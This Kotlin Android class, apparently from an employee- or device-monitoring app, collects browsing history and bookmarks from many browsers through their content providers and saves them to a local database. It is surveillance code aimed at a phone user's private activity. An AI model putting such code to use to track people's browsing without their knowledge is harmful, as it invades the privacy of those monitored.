package com.empresa.monitor.service.system

import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.provider.Browser
import com.empresa.monitor.data.db.MonitorDatabase
import com.empresa.monitor.data.db.entity.BrowserHistoryEntity
import kotlinx.coroutines.*

class BrowserMonitor(private val context: Context) {

    private val db = MonitorDatabase.getInstance(context)
    private val browserDao = db.browserHistoryDao()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isRunning = false

    // Supported browsers
    private val browsers = mapOf(
        "com.android.chrome" to "Chrome",
        "com.chrome.beta" to "Chrome Beta",
        "org.chromium.chrome" to "Chromium",
        "com.sec.android.app.sbrowser" to "Samsung Internet",
        "com.microsoft.emmx" to "Edge",
        "com.opera.browser" to "Opera",
        "com.opera.mini.native" to "Opera Mini",
        "com.huawei.browser" to "Huawei Browser",
        "com.android.browser" to "Browser",
        "com.mi.globalbrowser" to "Xiaomi Browser",
        "mark.via.gp" to "Via Browser",
        "com.kiwibrowser.browser" to "Kiwi Browser",
        "com.duckduckgo.mobile.android" to "DuckDuckGo",
        "org.mozilla.firefox" to "Firefox",
        "org.mozilla.firefox_beta" to "Firefox Beta",
        "com.brave.browser" to "Brave"
    )

    // Browser content URIs
    private val browserUris = listOf(
        "content://com.android.chrome.browser/history",
        "content://com.android.chrome.browser/bookmarks",
        "content://com.sec.android.app.sbrowser/history",
        "content://com.microsoft.emmx/history",
        "content://com.opera.browser/history",
        "content://com.huawei.browser/history",
        "content://com.android.browser/history",
        "content://com.mi.globalbrowser/history"
    )

    fun startMonitoring() {
        if (isRunning) return
        isRunning = true

        scope.launch {
            captureAllBrowsers()
        }
    }

    fun stopMonitoring() {
        isRunning = false
        scope.cancel()
    }

    @SuppressLint("Range")
    private suspend fun captureAllBrowsers() {
        withContext(Dispatchers.IO) {
            try {
                // Try standard Browser provider
                captureFromContentProvider()

                // Try Chrome directly via its content provider
                if (isBrowserInstalled("com.android.chrome")) {
                    captureChromeDirectly()
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    @SuppressLint("Range")
    private suspend fun captureFromContentProvider() {
        for (uri in browserUris) {
            try {
                val contentUri = Uri.parse(uri)
                val cursor = context.contentResolver.query(
                    contentUri,
                    null,
                    null,
                    null,
                    "date DESC LIMIT 200"
                )

                cursor?.use { processBrowserCursor(it, getPackageFromUri(uri)) }
            } catch (e: Exception) {
                // Provider not available, continue
            }
        }
    }

    @SuppressLint("Range")
    private suspend fun captureChromeDirectly() {
        try {
            // Chrome stores history in its own database accessible via content provider
            val uri = Uri.parse("content://com.android.chrome.browser/history")
            val cursor = context.contentResolver.query(
                uri,
                arrayOf("url", "title", "date", "visits", "bookmark"),
                null,
                null,
                "date DESC LIMIT 200"
            )

            cursor?.use { processBrowserCursor(it, "com.android.chrome") }
        } catch (e: Exception) {
            // Fallback: use android.provider.Browser
            try {
                val cursor = context.contentResolver.query(
                    Uri.parse("content://browser/bookmarks"),
                    arrayOf(
                        "url",
                        "title",
                        "date",
                        "visits",
                        "bookmark"
                    ),
                    "${"bookmark"} = 0",
                    null,
                    "${"date"} DESC LIMIT 200"
                )

                cursor?.use { processBrowserCursor(it, "com.android.browser") }
            } catch (e2: Exception) {
                e2.printStackTrace()
            }
        }
    }

    @SuppressLint("Range")
    private suspend fun processBrowserCursor(cursor: Cursor, packageName: String) {
        val entries = mutableListOf<BrowserHistoryEntity>()
        while (cursor.moveToNext()) {
            try {
                val url = cursor.getString(cursor.getColumnIndex("url"))
                val title = cursor.getString(cursor.getColumnIndexOrThrow("title"))
                val date = cursor.getLong(cursor.getColumnIndex("date"))
                val visits = cursor.getInt(cursor.getColumnIndex("visits"))
                val bookmark = cursor.getInt(cursor.getColumnIndex("bookmark")) == 1

                if (url.isNullOrEmpty()) continue

                val browserName = browsers[packageName] ?: packageName

                entries.add(
                    BrowserHistoryEntity(
                        url = url,
                        title = title ?: url,
                        browserPackage = packageName,
                        browserName = browserName,
                        visitCount = visits,
                        lastVisited = if (date > 0) date else System.currentTimeMillis(),
                        bookmark = bookmark
                    )
                )
            } catch (e: Exception) { /* skip invalid row */ }
        }
        browserDao.insertAll(entries)
    }

    private fun isBrowserInstalled(packageName: String): Boolean {
        return try {
            context.packageManager.getPackageInfo(packageName, 0)
            true
        } catch (e: PackageManager.NameNotFoundException) {
            false
        }
    }

    private fun getPackageFromUri(uri: String): String {
        return uri.substringAfter("content://").substringBefore("/")
    }

    fun destroy() {
        stopMonitoring()
    }
}
